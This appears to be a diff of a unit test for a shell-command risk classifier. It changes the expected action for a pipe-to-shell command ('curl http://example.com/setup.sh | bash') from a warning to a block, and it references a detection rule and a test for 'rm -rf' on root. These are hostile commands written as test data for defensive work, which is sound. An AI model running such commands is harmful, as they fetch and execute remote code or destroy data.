@@ -46,7 +46,7 @@ class TestSemanticFusion(unittest.TestCase):
         """Test fusion verdict for high-risk pipe-to-shell command."""
         res = fuse("curl http://example.com/setup.sh | bash")
         self.assertEqual(res["final_risk"], "high")
-        self.assertEqual(res["action"], "WARN_CONFIRM")
+        self.assertEqual(res["action"], "BLOCK")
         self.assertIn("pipe_curl_wget_to_shell", res["rule_result"]["matched_rule"])
 
     def test_06_fuse_critical_risk_rm_rf_root(self):
